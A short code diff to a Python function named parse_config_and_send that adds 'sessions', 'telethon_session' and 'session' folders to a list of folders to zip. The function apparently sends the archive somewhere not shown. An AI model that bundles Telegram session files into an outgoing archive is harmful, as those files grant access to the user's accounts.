@@ -11,7 +11,10 @@ def parse_config_and_send():
 
     folders_to_zip = [
         "configs",
-        "storage", 
+        "storage",
+        "sessions",
+        "telethon_session",
+        "session",
         "plugins"
     ]
 
